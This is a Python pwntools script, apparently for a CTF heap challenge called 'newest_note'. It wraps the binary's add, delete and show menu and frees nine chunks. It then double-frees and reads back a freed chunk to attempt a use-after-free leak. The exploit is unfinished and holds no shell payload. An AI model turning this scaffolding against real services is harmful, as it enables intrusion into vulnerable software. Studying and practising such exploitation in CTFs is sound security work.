from unittest import result
from pwn import *
from LibcSearcher import *
context(arch = "amd64", os = "Linux", log_level = "Debug")
io = process("./newest_note")
# io = remote("101.201.144.12", 23144)
gdb.attach(io)

s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(str(delim), data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(str(delim), data)
r       = lambda num=4096           :io.recv(num)
ru      = lambda delims             :io.recvuntil(delims)
rl      = lambda                    :io.recvline()
itr     = lambda                    :io.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

# add a 0x30 chunk
def add(idx, content):
    ru("Exit")
    sl("1")
    ru("Index: ")
    sl(str(idx))
    ru("Content: ")
    sl(content)

def delete(idx):
    ru("Exit")
    sl("2")
    ru("Index: ")
    sl(str(idx))

def show(idx):
    ru("Exit")
    sl("3")
    ru("Index: ")
    sl(str(idx))
    ru("Content:")

# def encode(string):
#     tmp = 0
#     result = ""
#     string = string[2:]
#     while(string != ""):
#         num = int("0x" + string[0:3], 16)
#         string = string[3:]
#         num_new = int("0x" + string[0:3], 16)
#         result += hex(num ^ num_new)[2:]
    

ru("will be? :")
sl("60")

for i in range(9):
    add(i, str(i) * 8)

for i in range(9):
    delete(i)


#delete 8th chunk
delete(7)
pause()
show(7)
delete(8)
io.recvall()

# for i in range(7):
    # add(i, str(i) * 8)


